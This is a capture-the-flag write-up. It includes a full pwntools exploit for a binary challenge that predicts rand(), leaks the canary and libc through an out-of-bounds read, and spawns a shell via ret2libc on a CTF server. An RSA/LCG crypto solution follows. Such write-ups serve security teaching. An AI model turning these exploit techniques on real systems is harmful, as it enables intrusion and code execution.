## PWN
### a drop of tear
srand() is called using the first 4 bytes of the flag as seed, which we know is "ACS{", thus with that we can predict what numbers rand() will give

when you input "101", you can enter a byte. The byte you give will be used to index an array, and the value of arr[idx] will be used to do a comparison with rand()
```C
            uVar1 = rand();
            if (uVar1 == local_130) {
              puts("Correct! wow..");
              guessed_num();
            }
```

you can also perform operations on the value before it is compared with rand()
```C
            puts("what if choice is.....?");
            __isoc99_scanf(&%c,&local_135);
            getchar();
            if (local_135 == '/') {
              puts("divided by...?");
              __isoc99_scanf(&%d,&local_12c);
              getchar();
              local_130 = (int)local_130 / local_12c;
            }
            else {
              if (local_135 < '0') {
                if (local_135 == '-') {
                  puts("minus...?");
                  __isoc99_scanf(&%d,&local_12c);
                  getchar();
                  local_130 = local_130 - local_12c;
                }
                else {
                  if (local_135 < '.') {
                    if (local_135 == '*') {
                      puts("multiply...?");
                      __isoc99_scanf(&%d,&local_12c);
                      getchar();
                      local_130 = local_12c * local_130;
                    }
                    ...
```

the array has oob access using chars that have ascii code less than 0x41
```C
local_130 = local_128[(int)((local_130 & 0xff) - 0x41)];
``` 

Thus, we can use this to copy over values on the stack that we want to leak.


Since we know the random values that are going to be used, I shift the bit that we are trying to leak all the way to the left, and fill in the rest of the 31 bits using the predicted random value

I used multiplication to shift the bits left side since (a * 2\*\*n) is the same as a << n.

If I get the correct guess, it means that the bit is the same as the most significant bit as the random value, if the guess is wrong, then the bit is different.

We can use this to leak canary and libc, then perform a ret2libc on the stack by using the stack bof from option 102.

```py
from pwn import *
from ctypes import CDLL
#io = process("./tear",aslr=True)
io = remote("10.100.0.43",10002)
libc = ELF("./libc.so.6")
cdll_libc = CDLL('libc.so.6')
cdll_libc.srand(0x7b534341)

def brute_bit(s):
    # to use this func, bit alr has to be setup
    # only DONT change MSB
    state = s
    cur_rand = cdll_libc.rand()
    target = cur_rand & 0x7fffffff 
    state = (state&0x7fffff00) + ord('?') 
    diff = abs(target-state)    

    if (target > state):
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",b"?") # to choose back guess
        io.sendlineafter(b"choice",b"+")
        io.sendlineafter(b"plus...?",str(diff).encode())
    
    else:
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",b"?")
        io.sendlineafter(b"choice",b"-")
        io.sendlineafter(b"minus...?",str(diff).encode())

    resp = io.recvuntil(b"..")
    if b"wow" in resp:
        # bit matches the rand
        io.sendline(b"2069054273")
    
        # have to do this for some reason
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",b"A")
        io.sendlineafter(b"choice",b"-")
        cdll_libc.rand() 
        
        return cur_rand >> 31

    else:
        # bit does not match the rand
        return not (cur_rand >> 31)


def brute_qword(idx,start_bit,end_bit,known=0):
    # brute start bit - end bit, inclusive
    qword = known

    for i in range(start_bit,end_bit+1):
        # load the ptr we want to leak
        # multiply 2**n shift n bytes to left
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",idx.to_bytes(1,"little"))
        io.sendlineafter(b"choice",b"*")
        io.sendlineafter(b"multiply...?",str(2**(31-i)).encode())
        cdll_libc.rand() 

        new_bit = brute_bit(qword << (31-i))
        qword = (new_bit<<i) + qword

    log.info("QWORD BRUTED")
    return qword


canary = (brute_qword(0xc,0,31)<<32) + (brute_qword(0xb,8,31))
log.info("CANARY: " + hex(canary))

libc.address = (brute_qword(0x1c,0,15)<<32) + brute_qword(0x1b,8,31,known=0xe3) - libc.symbols["_IO_file_overflow"] - 259
log.info("LIBC BASE: " + hex(libc.address))

pop_rdi = p64(libc.address + 0x10f75b)
ret = p64(libc.address + 0x10f75c)

ret2libc = b"A"*0x108 + p64(canary) + p64(0) + ret
ret2libc +=  pop_rdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])

io.sendlineafter(b"relieved.",b"102")
io.sendlineafter(b"skill.",ret2libc)

io.sendline(b"cat /home/acs_ctf/flag")
io.interactive()
```

## Crypto
### secret_encrypt
We just have to find the value of p to be able to decrypt the rsa, and p is processed in the secret() function

```py
def secret():
    global secret1,secret2,secret3,secret4
    result = 0
    temp_secret1 = secret1
    temp_secret3 = secret3
    while temp_secret3 > 0:
        if (temp_secret3 & 1) == 1:
            result = (result + temp_secret1) % secret2

        temp_secret1 = (temp_secret1 * 2) % secret2
        temp_secret3 >>= 1 # go to next bit
    secret1 = (result + secret4) % secret2
    return secret1
```

what secret() does is essentially:  
secret_1 = (secret_1\*secret_3 + secret_4) mod secret_2

After each secret() call, only secret_1 is edited, the other secrets remain constant

We are given the output of 3 secret() calls, so:
1. out1, calculated using secret_1 = p
2. out2, calculated using secret_1 = out1
3. out3, calculated using secret_1 = out2

Thus (s1 represents secret_1):
```
out1 = s1*s3 + s4
out2 = (s1*s2 + s4)*s3 + s4 
     = (s1)(s3)(s3) + s4(s3) + s4
out3 = ((s1)(s3)(s3) + s4(s3) + s4)s3 + s4 
     = (s1)(s3)(s3)(s3) + (s4)(s3)(s3) + s4(s3) + s4
```

And
```
out3 - out2*s3 = s4 = out2 - out1*s3

Solving the equation:
s3 = (out3-out2) / (out2-out1)
   = (out3-out2)*(out2-out1)^-1
s4 = out3-out2*s3 

out1 = s1*s3 + s4
s1 = (out1-s4)/s3
```

with that we can get p and can decrypt the ciphertext


```py
n=...
enc=...
secret_out=...

o1 = secret_out[0]
o2 = secret_out[1]
o3 = secret_out[2]
s2 = 2**1024
e = 65537


s3 = ((o3-o2)*inverse_mod(o2-o1,s2)) % s2
s4 = (o3-o2*s3) % s2
s1 = p = ((o1-s4)*inverse_mod(s3,s2)) % s2


# decrypt RSA
q = n/p
totient = (p-1)*(q-1)
d = inverse_mod(e,totient)

print(pow(enc,d,n))
```

